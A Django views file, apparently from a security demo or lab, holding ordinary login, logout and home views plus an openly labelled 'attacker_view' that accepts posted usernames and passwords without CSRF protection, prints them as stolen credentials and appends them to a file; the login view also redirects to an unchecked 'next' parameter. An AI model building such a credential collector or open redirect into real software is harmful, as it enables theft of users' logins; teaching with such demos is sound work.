from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.contrib import messages
import json
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

def login_view(request):
    """Handle user login"""
    if request.user.is_authenticated:
        return redirect('home')
    
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        
        user = authenticate(request, username=email, password=password)
        
        if user is not None:
            login(request, user)
            messages.success(request, 'You have successfully logged in!')
            next_url = request.GET.get('next', 'home')
            return redirect(next_url)
        else:
            messages.error(request, 'Invalid email or password.')
    
    return render(request, 'login.html')


def logout_view(request):
    """Handle user logout"""
    if request.method == 'POST':
        logout(request)
        messages.success(request, 'You have been logged out successfully.')
        return redirect('login')
    return redirect('home')


@csrf_exempt
def attacker_view(request):
    context = {}
    
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            email = data.get('username')
            password = data.get('password')
            
            if email and password:
                print(f"[ATTACKER] STOLEN CREDENTIALS")
                print(f"[ATTACKER] Email: {email}")
                print(f"[ATTACKER] Password: {password}")
                print(f"[ATTACKER] " + "="*50)
                
                # Save stolen credentials to file
                with open('stolen_credentials.txt', 'a') as f:
                    f.write(f"Email: {email}, Password: {password}\n")
            
            context['captured_email'] = email
            context['captured_password'] = password
            
        except json.JSONDecodeError:
            print("[ATTACKER] Failed to parse JSON")
    
    return render(request, 'attacker.html', context)


@login_required
def home_view(request):
    """Home page - requires authentication"""
    return render(request, 'home.html')
